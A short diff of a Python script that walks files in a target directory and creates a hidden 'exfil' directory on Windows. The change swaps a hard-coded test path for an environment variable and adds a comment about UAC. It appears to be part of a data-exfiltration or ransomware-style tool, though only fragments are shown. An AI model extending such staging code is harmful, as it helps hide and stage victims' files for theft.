@@ -3,12 +3,17 @@ import os
 import asyncio
 import ctypes
 
+from dotenv import load_dotenv, dotenv_values
+
 
 
 def iterate_files():
 
+    load_dotenv()
+    dir = os.getenv("SYS_PATH")
+
     # test dir
-    directory = "C:/Users/jgwfl/OneDrive/Desktop/test_dir"
+    directory = dir
 
     #file paths
     files = []
@@ -37,6 +42,7 @@ def create_hidden_dir(directory):
         #if os is windows
         if os.name == "nt":
             #set file property to hidden
+            #this triggers UAC.
             ctypes.windll.kernel32.SetFileAttributesW(ctypes.c_wchar_p(exfil), 0x02)
         return exfil
     except FileExistsError:
